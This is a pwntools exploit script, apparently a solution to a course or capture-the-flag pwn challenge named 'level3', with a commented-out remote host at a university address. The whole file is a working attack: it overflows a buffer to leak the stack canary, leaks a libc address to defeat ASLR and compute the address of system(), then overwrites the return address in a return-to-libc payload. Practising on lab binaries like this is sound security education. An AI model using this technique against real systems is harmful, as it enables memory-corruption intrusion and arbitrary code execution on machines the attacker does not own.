from pwn import *

# port = 10006
# rem = remote("kayle.snu.ac.kr", port)
rem = process("./level3/problem/level3")
gdb.attach(rem)

lib = ELF('./level3/problem/libc.so.6')

rem.recvline()

payload = b'A' * 0x49
rem.send(payload)
rem.recvuntil(payload)
canary = u64(b'\x00' +rem.recvn(7))
print(hex(canary))

payload = b'B' * 0x68
rem.send(payload)
rem.recvuntil(payload)
# print(hex(u64(rem.recvn(6) + b'\x00' * 2)))
print(hex(lib.symbols['__libc_start_main']))
lib_base = u64(rem.recvn(6) + b'\x00' * 2) - 243 - lib.symbols['__libc_start_main']
sys_addr = lib_base + lib.symbols['system']
# print(hex(lib_base))

payload = b'C' * 0x28 + p64(canary) + b'C' * 0x8 + p64(sys_addr+ 1)
rem.recvuntil(b'comment: ')
rem.send(payload)
rem.recvline()

# rem.interactive()